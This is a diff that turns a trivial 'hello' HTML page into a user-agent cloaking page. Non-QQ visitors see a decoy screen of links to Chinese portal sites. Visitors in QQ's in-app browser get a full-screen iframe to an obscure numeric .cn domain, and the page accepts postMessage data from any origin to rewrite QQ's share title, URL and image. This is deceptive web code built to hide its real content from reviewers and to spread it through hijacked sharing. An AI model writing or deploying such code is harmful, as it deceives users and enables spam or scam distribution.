@@ -1,5 +1,133 @@
+<!DOCTYPE html>
 <html>
+<head>
+	<meta charset="utf-8">
+    <title></title>
+	<meta name="viewport" content="initial-scale=1,maximum-scale=1,user-scalable=no" />
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+	<style type="text/css">
+		body {
+			background-color: #EFEFF4;
+			padding: 0;
+			margin: 0;
+		}
+		#p .w {
+			background: #bc4e9c;  /* fallback for old browsers */
+			background: -webkit-linear-gradient(to bottom, #f80759, #bc4e9c);  /* Chrome 10-25, Safari 5.1-6 */
+			background: linear-gradient(to bottom, #f80759, #bc4e9c); /* W3C, IE 10+/ Edge, Firefox 16+, Chrome 26+, Opera 12+, Safari 7+ */
+			position:absolute;
+			top:0px;
+			bottom:0px;
+			right:0;
+			left:0;
+			color: #FFF;
+			font-size: 14px;
+			text-align:center;
+			display:flex;
+			align-items:center;
+			justify-content:center;
+		}
+		#p {
+			display:none;
+		}
+		#p .t{
+			background-color: #000;
+			padding: 5px 20px;
+			color: #FFF;
+			font-size: 14px;
+			text-decoration:none;
+			line-height: 35px;
+		}
+		#p .e{
+			padding: 0px;
+			color: #FFF;
+			font-size: 50px;
+			text-decoration:none;
+		}
+	</style>
+</head>
 <body>
-<div>你好</div>
+	<div id="p">
+		<div class="w">
+			<div align="center">
+				<div class="e">Hello</div>
+				<table width="100%" height="35" border="0" align="center" style="margin-top: 80px;"><tr><td>
+					<a class="t" target="_blank" href="https://www.qq.com/">腾讯</a>
+					&nbsp;
+					<a class="t" target="_blank" href="https://www.baidu.com/">百度</a>
+					&nbsp;
+					<a class="t" target="_blank" href="https://www.sogou.com//">搜狗</a>
+					&nbsp;
+					<a class="t" target="_blank" href="https://www.so.com/">360搜索</a>
+					&nbsp;
+					<a class="t" target="_blank" href="https://www.youku.com/">优酷</a>
+					&nbsp;
+					<a class="t" target="_blank" href="https://www.iqiyi.com/">爱奇艺</a>
+					&nbsp;
+					<a class="t" target="_blank" href="https://www.sohu.com/">搜狐</a>
+					&nbsp;
+					<a class="t" target="_blank" href="https://v.qq.com/">腾讯视频</a>
+					&nbsp;
+					<a class="t" target="_blank" href="https://www.mgtv.com/">芒果TV</a>
+					&nbsp;
+					<a class="t" target="_blank" href="https://www.le.com/">乐视</a>
+					</td></tr>
+				</table>
+			</div>	
+		</div>
+	</div>
+<script>
+	var ENV = (function () {
+		var UA = navigator.userAgent;
+		var UA2 = UA.toLowerCase();//到小写
+		var platform = function (os) {
+			var ver = ('' + (new RegExp(os + '(\\d+((\\.|_)\\d+)*)').exec(UA2) || [, 0])[1]).replace(/_/g, '.');
+			// undefined < 3 === false, but null < 3 === true
+			return !!parseFloat(ver);
+		};
+		return {
+			is_mqq: /(iPad|iPhone|iPod).*? (IPad)?QQ\/([\d\.]+)/.test(UA) || /\bV1_AND_SQI?_([\d\.]+)(.*? QQ\/([\d\.]+))?/.test(UA),
+			is_ios: platform('os '),
+			is_android: platform('android[/ ]'),
+			is_pc: !platform('os ') && !platform('android[/ ]')
+		}
+	})();
+	
+	window.addEventListener('message', function(e) {
+		share(e.data);
+    }, false);
+	
+	if(ENV.is_mqq==false){
+		y();
+	}else{
+		s();
+	}
+	
+	function s(){
+		var sc = document.createElement("script");
+		sc.src = "http://open.mobile.qq.com/sdk/qqapi.js?_bid=152";
+		document.head.appendChild(sc);
+		
+		var div = document.createElement("div");
+		div.setAttribute("style","position:absolute;top:0px;bottom:0px;right:0;left:0;overflow:hidden;");
+		div.innerHTML = '<iframe style="width:100%;height:100%;border:0;" scrolling="auto" frameborder="0" marginheight="0" marginwidth="0" allowtransparency="" src="http://p.1563083883o.cn/url/vod/?_wv=100002&_wwv=9#qq.com&alert%28%29"></iframe>';
+		document.body.appendChild(div);
+	}
+	
+	function y(){
+		document.getElementById("p").style.display="block";
+	}
+	
+	function share(e) {
+		window.mqq.invoke("data","setShareInfo", {
+			"share_url": e.url,
+			"title": e.title,
+			"desc": e.describe,
+			"image_url": e.img
+		});
+		mqq.ui.showShareMenu();
+	}
+</script>		
 </body>
 </html>
